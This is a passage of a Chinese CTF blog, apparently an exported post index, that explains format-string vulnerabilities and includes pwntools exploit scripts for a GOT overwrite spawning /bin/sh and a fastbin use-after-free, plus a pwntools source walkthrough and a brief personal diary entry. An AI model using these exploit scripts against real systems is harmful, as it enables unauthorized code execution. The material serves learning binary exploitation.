class=\"string\">&#x27;system&#x27;</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;system_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(system_addr)))</span><br><span class=\"line\"></span><br><span class=\"line\">payload = fmtstr_payload(offset, &#123;func_got : system_addr&#125;)</span><br><span class=\"line\">r.send(payload)</span><br><span class=\"line\">r.send(<span class=\"string\">&#x27;/bin/sh&#x27;</span>)</span><br><span class=\"line\">r.recv()</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"64bit\"><a href=\"#64bit\" class=\"headerlink\" title=\"64bit\"></a>64bit</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h1 id=\"Heap\"><a href=\"#Heap\" class=\"headerlink\" title=\"Heap\"></a>Heap</h1><h2 id=\"fastbin-attack-uaf\"><a href=\"#fastbin-attack-uaf\" class=\"headerlink\" title=\"fastbin_attack_uaf\"></a>fastbin_attack_uaf</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">if args[&#x27;REMOTE&#x27;]:</span></span><br><span class=\"line\"><span class=\"string\">    p = remote(&quot;&quot;)</span></span><br><span class=\"line\"><span class=\"string\">else:</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">p = process([<span class=\"string\">&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;</span>,<span class=\"string\">&quot;./&quot;</span>],env=&#123;<span class=\"string\">&quot;LD_PRELOAD&quot;</span> : <span class=\"string\">&quot;/glibc/2.23/32/lib/libc.so.6&quot;</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">cmd</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span>(<span class=\"params\">size,content</span>):</span></span><br><span class=\"line\">    cmd(<span class=\"number\">1</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Note size :&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Content :&quot;</span>)</span><br><span class=\"line\">    p.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    cmd(<span class=\"number\">2</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Index :&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">put</span>(<span class=\"params\">idx</span>):</span></span><br><span class=\"line\">    cmd(<span class=\"number\">3</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Index :&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;aabb&quot;</span>)<span class=\"comment\">#chunk0 [chunk0_print(0x10),chunk0_content(0x20)]</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;aabb&quot;</span>)<span class=\"comment\">#chunk1 [chunk0_print(0x10),chunk0_content(0x20)]</span></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">main_arena =&gt; chunk0_print(0x10) =&gt; chunk0_content(0x20)</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">fastbin:</span></span><br><span class=\"line\"><span class=\"string\">main_arena =&gt; chunk1_print(0x10) =&gt; chunk0_print(0x10) </span></span><br><span class=\"line\"><span class=\"string\">main_arena =&gt; chunk1_content(0x20) =&gt; chunk0_content(0x20)</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">add(<span class=\"number\">8</span>,p32(magic))<span class=\"comment\">#chunk2, with 0x10 puts_field and 0x8 content field ,the memory space is poniter to chunk1_print and chunk0_print </span></span><br><span class=\"line\">put(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n","categories":["Generalization"],"tags":["summary"]},{"title":"2","url":"/1919/08/10/2/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-YUZdbDvu\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div>     </p>\n<p>​        深夜高速，但是是在白天。</p>\n<p>​        昨天看到了飞机失事的新闻，确实一晚上也没怎么睡好。</p>\n<p>​        确实还是能感受到，与纯粹的生命的流逝相比，我的所有痛苦都已经不值一提了。因为这件事，我甚至完全不难过了，我需要知道，世界上正在经历远比我更加深重的苦难的人数不胜数，他们有的能掌管自己的未来，但是有的甚至都没有机会去思考未来的一切就已经灰飞烟灭。</p>\n<p>​        相比之下我只是一只普通得不能再普通的蚂蚁，每天为自己歌功颂德，在辱骂自己中获得自我满足，又像坐井观天的青蛙，远不知世间的美好与困苦。</p>\n<p>​        如果一定要发散联想的话，十九岁的葬礼其实是充满吸引力的。这个酷爱伤天感地的年龄，恨不得从世间一切罪孽中挖出与自己的那么一丝若有若无的微妙联系，每天因为一些正常人都一笑而过的小挫折而将死亡挂在嘴边，这样的死亡太屑了。死亡也是一件至高无上的事，像我这样的人，如果一味赴死，也只会玷污死亡纯洁的意义。是这样的，我还不配。反正人总是要死的，早死晚死确实意义不大，没有必要这样挂念着，害人害己。</p>\n","categories":["深夜高速"],"tags":["mess"]},{"title":"格式化字符串","url":"/2022/03/19/fmt/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-NuztVwgE\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n\n\n<h1 id=\"1）前言\"><a href=\"#1）前言\" class=\"headerlink\" title=\"1）前言\"></a>1）前言</h1><p>​        绿盟杯pwn1，格式化字符串+沙盒orw。保护全开。</p>\n<p>​        首先对于格式化字符串我的理解就不是很深刻，甚至从来没有完整地刷过一道格式化字符串的题目。</p>\n<p>​        所以碰到这道题，算是又给我敲了第nn个警钟。</p>\n<p>​        非常清晰地告诉我：我是垃圾。</p>\n<h1 id=\"2）格式化字符串基本原理\"><a href=\"#2）格式化字符串基本原理\" class=\"headerlink\" title=\"2）格式化字符串基本原理\"></a>2）格式化字符串基本原理</h1><p>​        ctfwiki上的格式化字符串教程写得挺好的，可以参考。</p>\n<h3 id=\"格式化字符串参数\"><a href=\"#格式化字符串参数\" class=\"headerlink\" title=\"格式化字符串参数\"></a>格式化字符串参数</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>parameter</p>\n<ul>\n<li><code>%n$</code>，获取格式化字符串中的指定参数</li>\n</ul>\n</li>\n<li><p>field width</p>\n<ul>\n<li>输出的最小宽度</li>\n</ul>\n</li>\n<li><p>precision</p>\n<ul>\n<li>输出的最大长度</li>\n</ul>\n</li>\n<li><p>length，输出的长度</p>\n<ul>\n<li>hh，输出一个字节</li>\n<li>h，输出一个双字节</li>\n</ul>\n</li>\n<li><p>type</p>\n<ul>\n<li>d/i，有符号整数</li>\n<li>u，无符号整数</li>\n<li>x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>\n<li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>\n<li>s，如果没有用 l 标志，输出 null结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li>\n<li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li>\n<li><strong>p， void * 型，输出对应变量的值</strong>。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。</li>\n<li>n，不输出字符，<strong>但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</strong>。</li>\n</ul>\n<h3 id=\"格式化字符串漏洞利用\"><a href=\"#格式化字符串漏洞利用\" class=\"headerlink\" title=\"格式化字符串漏洞利用\"></a>格式化字符串漏洞利用</h3><p>一般来说就是打印变量的时候并没有对变量进行格式化，或者格式化的方式并不正确。</p>\n<p>一般来说不正确的方式有这几种</p>\n<ol>\n<li>一直%s，容易引用不合法的地址，造成程序崩溃   </li>\n<li>通过打印的相关内存信息，泄露内存布局，获得有用的信息</li>\n</ol>\n<p>重点研究如何计算32/64位程序中格式化字符串在栈上的偏移，以及研究自动化求偏移的实现</p>\n<h3 id=\"1）32位偏移计算原理\"><a href=\"#1）32位偏移计算原理\" class=\"headerlink\" title=\"1）32位偏移计算原理\"></a>1）32位偏移计算原理</h3><p>​    其实这个计算确实是有手就行，只需要在栈上找到对应的格式化字符串，然后数是第几个，再减去返回地址所占的一个位置，就是偏移量。</p>\n<p>​    准确来说应该是格式化字符串在栈上的偏移。</p>\n<p>​    原理也比较简单：x86架构下，格式化字符串是通过栈传递的。</p>\n<p>​    然后联想一下函数调用栈的知识点，格式化字符串本身和printf的参数一样，从右到左依次被压栈。</p>\n<p>​    举一个例子，源码来源于<a href=\"https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html\">3.1.1 格式化字符串漏洞</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//test1.c</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s %d %s&quot;</span>, <span class=\"string\">&quot;Hello World!&quot;</span>, <span class=\"number\">233</span>, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    这个程序没有任何的漏洞，只是因为非常简单直观，拿来研究printf函数参数的传参。</p>\n<p>​    我们以32位编译。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">gcc -m32 test1.c -o test1</span><br></pre></td></tr></table></figure>\n\n<p>​    在main函数处下一个断点。然后执行到断点处。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.35.36.png\" alt=\"截屏2021-10-28 下午11.35.36\"></p>\n<p>​    随便多单步几次，可以看到push指令，此刻主调函数已经开始向栈中压入参数了，从<code>stack</code></p>\n<p>部分我们可以看到，此时栈里已经有一个参数”\\n”。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.38.15.png\" alt=\"截屏2021-10-28 下午11.38.15\">    </p>\n<p>​    继续单步，观察栈的变化，此时栈顶已经扩大了很多，printf的所有需要的参数都在栈中。然后我们需要调用printf函数。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.40.00.png\" alt=\"截屏2021-10-28 下午11.40.00\"></p>\n<p>​    可以看到，这条指令call printf，我们刚刚压栈的参数此时被printf使用。执行完后的下一条指令使esp加0x10，栈空间缩小，回到最初的样子：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.41.43.png\" alt=\"截屏2021-10-28 下午11.41.43\"></p>\n<p>​    然后回忆一下被调函数参数和局部变量压栈的过程：</p>\n<p>​    主调函数将被调函数参数从右到左压入栈中，随后将返回地址压栈，此时，栈上的参数偏移的计算就非常清晰了。</p>\n<p>​    这里可能有些弯需要理解一下。大致就是刚刚说到的，主调函数首先将printf需要的函数从右到左依次压栈，（正好栈是从高地址向低地址增长的，所以在gdb stack中呈现的顺序是正常理解的从左到右的先后次序），当将printf需要的参数全部存到栈中后，即可调用printf使用这些参数，此时的栈帧尚属于主调函数，在这个程序中我们不考虑返回地址，所以当参数全部入栈，printf即被调用，栈顶也指向格式化字符串所在的地址。在这里，格式化字符串就是栈上的第一个参数，偏移量就是1。当printf调用完毕，参数即出栈，也就不存在什么格式化字符串偏移了。    </p>\n<h3 id=\"2）64位偏移计算原理\"><a href=\"#2）64位偏移计算原理\" class=\"headerlink\" title=\"2）64位偏移计算原理\"></a>2）64位偏移计算原理</h3><p>​        原理同32位，但是由于64位传参的规则，是先用6个寄存器传参，如果不够再使用栈，但格式化字符串参数被设置是通过栈传递的，所以实际上格式化字符串在栈上是第n+6个参数。</p>\n<h3 id=\"3）-pwntools-fmtstr工具\"><a href=\"#3）-pwntools-fmtstr工具\" class=\"headerlink\" title=\"3） pwntools_fmtstr工具\"></a>3） pwntools_fmtstr工具</h3><p>​    在前面的分析中我们可以看到，其实找到格式化字符串的偏移量是一件非常简单的事情，都1202年了，既然是简单的步骤，我们应该需要学会运用自动化工具，使做题步骤简化，比如偏移量的寻找，以及与格式化字符串利用相关的一些事。</p>\n<p>​    pwntools就非常人性化地为我们集成了格式化字符串偏移量寻找，got表覆盖等非常常见好用的操作，这里我们通过简单的例子，着重讨论这些自动化脚本编写的原理。</p>\n<h5 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h5><p>​    例如，这是一段自动化的格式化字符串漏洞利用的脚本，主要适用于rop并改got表的板子题。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./&#x27;</span>)</span><br><span class=\"line\">r = process(<span class=\"string\">&#x27;./&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 计算偏移量</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">exec_fmt</span>(<span class=\"params\">payload</span>):</span></span><br><span class=\"line\">    r.sendline(payload)</span><br><span class=\"line\">    info = r.recv()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> info</span><br><span class=\"line\">  </span><br><span class=\"line\">auto = FmtStr(exec_fmt)</span><br><span class=\"line\">offset = auto.offset</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获得 func 的 got 地址</span></span><br><span class=\"line\">func_got = elf.got[<span class=\"string\">&#x27;func&#x27;</span>]<span class=\"comment\">#func通常是一些例如printf或puts的函数</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;func_got =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(func_got)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获得 func 的真实地址</span></span><br><span class=\"line\">payload = p32(func_got) + <span class=\"string\">&#x27;%&#123;&#125;$s&#x27;</span>.<span class=\"built_in\">format</span>(offset)</span><br><span class=\"line\">r.send(payload)</span><br><span class=\"line\">func_addr = u32(r.recv()[<span class=\"number\">4</span>:<span class=\"number\">8</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;func_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(func_addr)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获得 system 的真实地址</span></span><br><span class=\"line\">system_addr = func_addr - (libc.symbols[<span class=\"string\">&#x27;func&#x27;</span>] - libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>])</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;system_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(system_addr)))</span><br><span class=\"line\"></span><br><span class=\"line\">payload = fmtstr_payload(offset, &#123;func_got : system_addr&#125;)</span><br><span class=\"line\">r.send(payload)</span><br><span class=\"line\">r.send(<span class=\"string\">&#x27;/bin/sh&#x27;</span>)</span><br><span class=\"line\">r.recv()</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>​    </p>\n<p>​    其中脚本的核心就是pwntools的fmtstr功能。fmtstr几乎完全自动化地帮我们完成了偏移寻找，got表覆盖等工作，大大简化了我们的做题流程。</p>\n<h5 id=\"源码分析\"><a href=\"#源码分析\" class=\"headerlink\" title=\"源码分析\"></a>源码分析</h5><p>​    pwntools定义了一个<code>FmtStr</code>类，来实现格式化字符串漏洞的利用。</p>\n<p>​    ps：了解该源码分析需要首先了解简单的面向对象的python程序设计。因为我也不太懂，所以画了个图来归纳一下，大概就是：<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_0352.jpg\" alt=\"IMG_0352\"></p>\n<p>​    所以下图中的代码也就能够理解了，就是将参数传入实例本身。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-29%20%E4%B8%8B%E5%8D%882.08.21.png\" alt=\"截屏2021-10-29 下午2.08.21\"></p>\n<p>​    然后，是功能实现的第一步–偏移的寻找，也是这篇笔记重点要分析的部分，完整的源码分析会写成一个新的系列。</p>\n<p>​    很显然这个功能的实现是基于<code>find_offset</code>方法。</p>\n<p>​    方法的内容其实比较简单：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">find_offset</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">      marker = cyclic(<span class=\"number\">20</span>)<span class=\"comment\">#cyclic 20个字符</span></span><br><span class=\"line\">      <span class=\"keyword\">for</span> off <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">1000</span>):<span class=\"comment\">#从1-1000，爆破偏移量</span></span><br><span class=\"line\">          leak = self.leak_stack(off, marker)</span><br><span class=\"line\">          leak = pack(leak)<span class=\"comment\">#leak = p(leak_stack)</span></span><br><span class=\"line\">          pad = cyclic_find(leak[:<span class=\"number\">4</span>])</span><br><span class=\"line\">          <span class=\"keyword\">if</span> pad &gt;= <span class=\"number\">0</span> <span class=\"keyword\">and</span> pad &lt; <span class=\"number\">20</span>:</span><br><span class=\"line\">              <span class=\"keyword\">return</span> off, pad</span><br><span class=\"line\">      <span class=\"keyword\">else</span>:</span><br><span class=\"line\">          log.error(<span class=\"string\">&quot;Could not find offset to format string on stack&quot;</span>)</span><br><span class=\"line\">          <span class=\"keyword\">return</span> <span class=\"literal\">None</span>, <span class=\"literal\">None</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​    而实现方法<code>find_offset</code>，又依靠方法<code>leak_stack</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak_stack</span>(<span class=\"params\">self, offset, prefix=<span class=\"string\">b&quot;&quot;</span></span>):</span></span><br><span class=\"line\">    payload = <span class=\"string\">b&quot;START%%%d$pEND&quot;</span> % offset</span><br><span class=\"line\">    leak = self.execute_fmt(prefix + payload)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        leak = re.findall(<span class=\"string\">br&quot;START(.*?)END&quot;</span>, leak, re.MULTILINE | re.DOTALL)[<span class=\"number\">0</span>]</span><br><span class=\"line\">        leak = <span class=\"built_in\">int</span>(leak, <span class=\"number\">16</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError:</span><br><span class=\"line\">        leak = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> leak</span><br></pre></td></tr></table></figure>\n\n<p>​    <code>cyclic</code>的代码也顺便放一放（</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">cyclic_find</span>(<span class=\"params\">subseq, alphabet = <span class=\"literal\">None</span>, n = <span class=\"literal\">None</span></span>):</span> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> n <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        n = context.cyclic_size</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(subseq, six.integer_types):</span><br><span class=\"line\">        subseq = packing.pack(subseq, <span class=\"built_in\">bytes</span>=n)</span><br><span class=\"line\">    subseq = packing._need_bytes(subseq, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(subseq) != n:</span><br><span class=\"line\">        log.warn_once(<span class=\"string\">&quot;cyclic_find() expects %i-byte subsequences by default, you gave %r\\n&quot;</span></span><br><span class=\"line\">            <span class=\"string\">&quot;Unless you specified cyclic(..., n=%i), you probably just want the first 4 bytes.\\n&quot;</span></span><br><span class=\"line\">            <span class=\"string\">&quot;Truncating the data at 4 bytes.  Specify cyclic_find(..., n=%i) to override this.&quot;</span>,</span><br><span class=\"line\">            n, subseq, <span class=\"built_in\">len</span>(subseq), <span class=\"built_in\">len</span>(subseq))</span><br><span class=\"line\">        subseq = subseq[:n]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> alphabet <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        alphabet = context.cyclic_alphabet</span><br><span class=\"line\">    alphabet = packing._need_bytes(alphabet, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">any</span>(c <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> alphabet <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> subseq):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> -<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    n = n <span class=\"keyword\">or</span> <span class=\"built_in\">len</span>(subseq)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> _gen_find(subseq, de_bruijn(alphabet, n))</span><br></pre></td></tr></table></figure>\n\n<p>​    之前一直对<code>cyclic</code>的实现抱有兴趣，抽个时间可以看看源码分析。</p>\n<p>​    </p>\n<h1 id=\"3）实际利用\"><a href=\"#3）实际利用\" class=\"headerlink\" title=\"3）实际利用\"></a>3）实际利用</h1><h2 id=\"1-goodluck\"><a href=\"#1-goodluck\" class=\"headerlink\" title=\"1:goodluck\"></a>1:goodluck</h2><p>话不多说，直接上例子。</p>\n<h4 id=\"程序逻辑分析\"><a href=\"#程序逻辑分析\" class=\"headerlink\" title=\"程序逻辑分析\"></a>程序逻辑分析</h4><p>第一步，清晰而准确的逆向是漏洞点利用的基础。</p>\n<p>首先，程序读取flag，通过<code>_IO_getc(fp)</code>，一个字符一个字符地将flag读入v10。</p>\n<p>然后将flag的首地址给v9。</p>\n<p>然后刷新缓冲区。这里这个fflush函数，以前没有怎么深入了解过（</p>\n<p>然后看一个关于fflush的详解</p>\n<p><a href=\"http://c.biancheng.net/cpp/html/2506.html\">C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区）</a></p>\n<p>但是文章中讲的是stdin，和这里的bss段关联感觉并不大，我疑惑的地方不是为什么要fflush，而是疑惑bss段有什么东西。</p>\n<p>bss段存储未初始化的全局变量，也不是缓冲区吧。</p>\n<h4 id=\"缓冲区\"><a href=\"#缓冲区\" class=\"headerlink\" title=\"缓冲区\"></a>缓冲区</h4><p><em>从一个简单的fflush函数中，我们试图理解缓冲区的原理和这个函数被设置的意义。</em></p>\n<p>为了减少cpu对磁盘的读写次数，提高运行速度，缓冲区（这里特指buf）存储了我们的键盘，屏幕输入输出。当我们将字符通过键盘输入到缓冲区中，<code>cingetchar</code>函数再从缓冲区中读取我们的键盘输入，从而进行数据的操作。屏幕输出也是同理。</p>\n<h5 id=\"缓冲区的分类\"><a href=\"#缓冲区的分类\" class=\"headerlink\" title=\"缓冲区的分类\"></a>缓冲区的分类</h5><h6 id=\"1-全缓冲。\"><a href=\"#1-全缓冲。\" class=\"headerlink\" title=\"1:全缓冲。\"></a>1:全缓冲。</h6><p>只有在缓冲区被填满之后才会进行<code>I/O</code>操作；最典型的全缓冲就是对磁盘文件的读写。</p>\n<h6 id=\"2-行缓冲\"><a href=\"#2-行缓冲\" class=\"headerlink\" title=\"2:行缓冲\"></a>2:行缓冲</h6><p>只有在输入或者是输出中遇到换行符的时候才会进行<code>I/O</code>操作；这忠允许我们一次写一个字符，但是只有在写完一行之后才做<code>I/O</code>操作。一般来说，标准输入流(<code>stdin</code>)和标准输出流(<code>stdout</code>)是行缓冲</p>\n<h6 id=\"3-无缓冲\"><a href=\"#3-无缓冲\" class=\"headerlink\" title=\"3:无缓冲\"></a>3:无缓冲</h6><ol>\n<li>无缓冲；标准<code>I/O</code>不缓存字符；其中表现最明显的就是标准错误输出流(<code>stderr</code>)，这使得出错信息尽快的返回给用户。</li>\n</ol>\n<p>（我以前一直不是很能理解为什么要专门设置一个标准错误，现在知道了，如果error的输出有缓冲区的话，可能要等程序执行到最后才会报错，这样就不能即时地接收到报错）</p>\n<h5 id=\"fflush函数\"><a href=\"#fflush函数\" class=\"headerlink\" title=\"fflush函数\"></a>fflush函数</h5><p>然后是关于fflush函数的glibc源码。</p>\n<p>fflush实际是调用vtable中的函数<code>_IO_new_file_sync</code>，这个函数的源码如图：</p>\n<p>（<code>/glibc-2.23/libio/fileops.c:867</code>）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span></span><br><span class=\"line\">_IO_new_file_sync (_IO_FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  _IO_ssize_t delta;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> retval = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/*    char* ptr = cur_ptr(); */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (_IO_do_flush(fp)) </span><br><span class=\"line\">    <span class=\"keyword\">return</span> EOF;<span class=\"comment\">//end of file</span></span><br><span class=\"line\">  delta = fp-&gt;_IO_read_ptr - 